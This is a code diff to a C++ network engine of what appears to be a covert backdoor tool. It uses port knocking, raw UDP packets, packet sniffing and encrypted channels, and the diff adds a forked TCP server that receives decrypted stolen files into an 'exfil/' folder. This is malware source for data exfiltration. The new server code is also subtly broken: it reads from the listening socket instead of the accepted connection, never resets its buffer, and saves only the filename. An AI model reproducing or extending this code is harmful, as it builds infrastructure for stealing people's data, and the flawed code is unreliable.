@@ -1,6 +1,7 @@
 #include "NetworkEngine.h"
 
 #include <cstring>
+#include <fstream>
 #include <iostream>
 
 #include <linux/if.h>
@@ -44,6 +45,8 @@ NetworkEngine::NetworkEngine(const std::string &interfaceName, const std::string
 
     this->crypto = new Crypto(key);
     this->knockController = new KnockController(interfaceName, pattern, port, duration);
+
+    this->startTcpServer(port);
 }
 
 /*
@@ -297,8 +300,7 @@ int NetworkEngine::knockAndSend(const in_addr &daddr, const UCharVector &data) {
     // perform knock
     for (unsigned short port : this->knockController->getPattern()) {
         // use random source port
-        this->sendRawUdp(this->ip, daddr, (Crypto::rand() % 55535) + 10000,
-                         port, blank);
+        this->sendRawUdp(this->ip, daddr, (Crypto::rand() % 55535) + 10000, port, blank);
         sleep(1);
     }
 
@@ -306,9 +308,7 @@ int NetworkEngine::knockAndSend(const in_addr &daddr, const UCharVector &data) {
     return this->sendCookedTcp(daddr, this->knockController->getPort(), data);
 }
 
-void NetworkEngine::startSyncSniff(const char *filter) {
-    this->runSniff(filter);
-}
+void NetworkEngine::startSyncSniff(const char *filter) { this->runSniff(filter); }
 
 /*
  * Starts the PCAP sniffing thread.
@@ -448,5 +448,81 @@ void NetworkEngine::gotPacket(unsigned char *args, const struct pcap_pkthdr *hea
 
     for (int i = 0; i < netEngine->LoopCallbacks.size(); i++) {
         (netEngine->LoopCallbacks[i])(header, packet, netEngine);
+    }
+}
+
+/*
+ *
+ */
+void NetworkEngine::startTcpServer(const unsigned short port) {
+    if (fork() != 0) return;
+
+    int sd;
+    int connfd;
+    unsigned int len;
+    struct sockaddr_in server;
+    struct sockaddr_in client;
+    UCharVector buffer;
+
+    if ((sd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
+        std::cerr << "could not create tcp socket" << std::endl;
+        return;
+    }
+
+    memset(&server, 0, sizeof(sockaddr_in));
+    server.sin_family = AF_INET;
+    server.sin_addr.s_addr = htonl(INADDR_ANY);
+    server.sin_port = htons(port);
+
+    if (bind(sd, (struct sockaddr *)&server, sizeof(struct sockaddr_in)) != 0) {
+        std::cerr << "could not bind" << std::endl;
+    }
+
+    if (listen(sd, 5) != 0) {
+        std::cerr << "could not listen on socket" << std::endl;
+    }
+
+    len = sizeof(struct sockaddr_in);
+
+    while (true) {
+        connfd = accept(sd, (struct sockaddr *)&client, &len);
+
+        NetworkEngine::readAllFromTcpSocket(sd, buffer);
+        UCharVector plaintext = this->getCrypto()->dec(buffer);
+
+        int index;
+        for (index = 0; index < plaintext.size(); index++) {
+            if (plaintext[index] == 0)
+                break;
+        }
+
+        // get filename and sanitize the string
+        std::string filename((char *)plaintext.data(), index);
+        for (int i = 0; i < filename.size(); i++) {
+            if (filename[i] == '/') {
+                filename[i] = '-';
+            }
+        }
+
+        std::ofstream outfile;
+        outfile.open("exfil/" + filename);
+        std::string output(plaintext.data(), plaintext.data() + index + 1);
+        outfile << output;
+        outfile.close();
+
+        close(connfd);
+    }
+
+    close(sd);
+}
+
+void NetworkEngine::readAllFromTcpSocket(const int sd, UCharVector &buffer) {
+    static const int tmpLen = 1500;
+
+    int numRead;
+    unsigned char tmp[tmpLen];
+
+    while ((numRead = read(sd, tmp, tmpLen)) > 0) {
+        buffer.insert(buffer.end(), tmp, tmp + numRead);
     }
 }
